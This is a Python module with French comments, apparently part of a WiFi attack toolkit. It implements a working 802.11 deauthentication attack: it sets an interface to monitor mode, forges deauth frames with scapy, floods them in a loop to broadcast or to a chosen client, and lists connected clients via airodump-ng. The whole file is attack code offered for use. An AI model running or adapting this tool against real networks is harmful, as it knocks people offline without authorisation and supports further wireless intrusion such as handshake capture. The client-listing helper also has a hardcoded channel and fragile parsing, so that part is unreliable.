#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module Deauth Attack
Attaque de déconnexion WiFi
"""

import os
import time
import threading
import subprocess
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth

class DeauthAttack:
    """Classe pour l'attaque Deauth"""
    
    def __init__(self, network_manager, logger):
        self.network_manager = network_manager
        self.logger = logger
        self.running = False
        self.attack_thread = None
        
    def start(self, config):
        """Démarre l'attaque Deauth"""
        self.config = config
        self.running = True
        
        self.logger.log("INFO", f"Démarrage de l'attaque Deauth sur {config['target_bssid']}")
        
        # Configuration de l'interface
        self.setup_interface()
        
        # Démarrage du thread d'attaque
        self.attack_thread = threading.Thread(target=self.send_deauth_packets)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
    def setup_interface(self):
        """Configure l'interface WiFi pour l'attaque"""
        interface = self.config['interface']
        channel = self.config.get('channel', 1)
        
        try:
            # Mise en mode monitor
            self.network_manager.set_monitor_mode(interface)
            
            # Configuration du canal
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                         capture_output=True, text=True)
            
            self.logger.log("INFO", f"Interface {interface} configurée en mode monitor sur le canal {channel}")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors de la configuration de l'interface: {str(e)}")
            raise
            
    def send_deauth_packets(self):
        """Envoie des paquets deauth"""
        interface = self.config['interface']
        target_bssid = self.config['target_bssid']
        client_mac = self.config.get('client_mac', None)
        packet_count = self.config.get('packet_count', 10)
        interval = self.config.get('interval', 1.0)
        
        self.logger.log("INFO", f"Envoi de paquets deauth vers {target_bssid}")
        
        while self.running:
            try:
                if client_mac:
                    # Deauth vers un client spécifique
                    self.send_deauth_to_client(interface, target_bssid, client_mac, packet_count)
                else:
                    # Deauth broadcast
                    self.send_broadcast_deauth(interface, target_bssid, packet_count)
                
                time.sleep(interval)
                
            except Exception as e:
                self.logger.log("ERROR", f"Erreur lors de l'envoi deauth: {str(e)}")
                break
                
    def send_deauth_to_client(self, interface, bssid, client_mac, count):
        """Envoie des paquets deauth vers un client spécifique"""
        try:
            # Paquet deauth (code 1: STA_LEAVING)
            deauth_packet = (
                Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) /
                Dot11Deauth(reason=1)
            )
            
            # Envoi des paquets
            for i in range(count):
                if not self.running:
                    break
                    
                sendp(deauth_packet, iface=interface, verbose=False)
                time.sleep(0.1)
                
            self.logger.log("INFO", f"{count} paquets deauth envoyés vers {client_mac}")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur deauth client: {str(e)}")
            
    def send_broadcast_deauth(self, interface, bssid, count):
        """Envoie des paquets deauth broadcast"""
        try:
            # Paquet deauth broadcast
            deauth_packet = (
                Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) /
                Dot11Deauth(reason=1)
            )
            
            # Envoi des paquets
            for i in range(count):
                if not self.running:
                    break
                    
                sendp(deauth_packet, iface=interface, verbose=False)
                time.sleep(0.1)
                
            self.logger.log("INFO", f"{count} paquets deauth broadcast envoyés")
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur deauth broadcast: {str(e)}")
    
    def get_connected_clients(self, bssid, interface):
        """Récupère la liste des clients connectés"""
        try:
            clients = []
            
            # Utilisation d'aircrack-ng pour détecter les clients
            cmd = ['airodump-ng', '--bssid', bssid, '--channel', '1', '--output-format', 'csv', interface]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                
                for line in lines:
                    if ',' in line and bssid not in line:
                        parts = line.split(',')
                        if len(parts) >= 6:
                            client_mac = parts[0].strip()
                            if client_mac and client_mac != 'Station MAC':
                                clients.append({
                                    'mac': client_mac,
                                    'first_seen': parts[1].strip(),
                                    'last_seen': parts[2].strip(),
                                    'power': parts[3].strip(),
                                    'packets': parts[4].strip(),
                                    'bssid': parts[5].strip()
                                })
            
            return clients
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur clients connectés: {str(e)}")
            return []
    
    def stop(self):
        """Arrête l'attaque Deauth"""
        self.running = False
        
        # Arrêt du thread
        if self.attack_thread:
            self.attack_thread.join(timeout=2)
            
        # Nettoyage
        self.cleanup()
        
        self.logger.log("INFO", "Attaque Deauth arrêtée")
        
    def cleanup(self):
        """Nettoie les ressources utilisées"""
        try:
            # Retour en mode managed
            if hasattr(self, 'config'):
                self.network_manager.set_managed_mode(self.config['interface'])
                
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lors du nettoyage: {str(e)}") 